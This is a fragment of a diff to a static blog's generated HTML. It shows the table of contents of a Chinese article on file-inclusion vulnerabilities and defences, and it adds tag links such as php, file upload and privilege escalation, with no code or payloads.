href="#session%E5%B8%B8%E8%A7%81%E5%AD%98%E5%82%A8%E8%B7%AF%E5%BE%84"><span class="toc-number">4.7.1.</span> <span class="toc-text">session常见存储路径</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6"><span class="toc-number">4.8.</span> <span class="toc-text">包含临时文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="toc-number">4.9.</span> <span class="toc-text">绕过技巧</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88"><span class="toc-number">5.</span> <span class="toc-text">防御方案</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%85%A5%E9%AA%8C%E8%AF%81"><span class="toc-number">5.1.</span> <span class="toc-text">输入验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE"><span class="toc-number">5.2.</span> <span class="toc-text">安全配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E9%98%B2%E6%8A%A4"><span class="toc-number">5.3.</span> <span class="toc-text">代码防护</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%8E%AA%E6%96%BD"><span class="toc-number">5.4.</span> <span class="toc-text">其他措施</span></a></li></ol></li></ol>
                     </div>
                 </span>
             </div>
@@ -410,6 +530,30 @@
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">XSS</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">php</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">反序列化</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">文件包含</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">文件上传</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">系统提权</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">Linux</a>
               </li>
             
             <div class="clearfix"></div>
